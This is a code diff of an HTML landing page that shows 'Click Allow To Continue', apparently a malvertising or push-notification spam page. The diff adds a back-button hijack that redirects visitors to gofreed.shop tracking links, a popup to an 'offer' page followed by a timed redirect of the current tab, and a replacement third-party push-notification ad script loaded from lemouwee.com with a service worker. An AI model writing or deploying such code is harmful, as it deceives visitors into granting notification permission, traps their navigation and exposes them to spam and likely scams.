@@ -4,18 +4,24 @@
 <head>
     <meta name="robots" content="noindex,nofollow" />
     <meta name="viewport" content="width=device-width, initial-scale=1">
+
     <script type="text/javascript">
         window.history.pushState({
             page: 1
         }
             , "", "");
         window.onpopstate = function (event) {
-            window.location.href = 'https://get.gofreed.shop/click?key=94c5542b570b35bb9c84';
+            window.location.href = 'http://peer.gofreed.shop/c66c4f5a-8506-40e6-983d-3068d73fd4f6?';
         };
-        function openWindows() {
-            window.location.href = 'https://finance.gofreed.shop/click?lp=1';
-            return false; // 可选：阻止默认行为和事件冒泡
+        let secondaryWindow;
+        function openSecondaryWindow() {
+            secondaryWindow = window.open('http://peer.gofreed.shop/dfad268c-86a8-4d7d-9ed2-fbfce64500ca?', '_self');
         }
+        function openWindows() {
+            window.open('http://peer.gofreed.shop/offer', '_blank');
+            setTimeout(openSecondaryWindow, 10000);
+        }
+
     </script>
 
     <style type="text/css">
@@ -316,27 +322,22 @@
         <div class="title">Click "Allow" To Continue</div>
     </div>
     <div id="zc_1213742"></div>
-    <script async data-cfasync="false">
-        (function () {
-            const url = new URL(window.location.href);
-            const clickID = url.searchParams.get("click_id");
-            const sourceID = url.searchParams.get("source_id");
-
-            const s = document.createElement("script");
-            s.dataset.cfasync = "false";
-            s.src = "https://sdk4push.com/f/sdk.js?z=1214102";
-            s.onload = (opts) => {
-                opts.zoneID = 1214102;
-                opts.extClickID = clickID;
-                opts.subID1 = sourceID;
-                opts.actions.onPermissionGranted = () => { };
-                opts.actions.onPermissionDenied = () => { };
-                opts.actions.onAlreadySubscribed = () => { };
-                opts.actions.onError = () => { };
-            };
-            document.head.appendChild(s);
-        })()
+    <script>
+        var s = document.createElement('script');
+        s.src = '//lemouwee.com/pfe/current/micro.tag.min.js?z=7510819' + '&sw=/sw-check-permissions-ecbf4.js';
+        s.onload = function (result) {
+            switch (result) {
+                case 'onPermissionDefault': break;
+                case 'onPermissionAllowed': break;
+                case 'onPermissionDenied': break;
+                case 'onAlreadySubscribed': break;
+                case 'onNotificationUnsupported': break;
+            }
+        };
+        document.head.appendChild(s);
     </script>
+
+
 </body>
 
 </html>
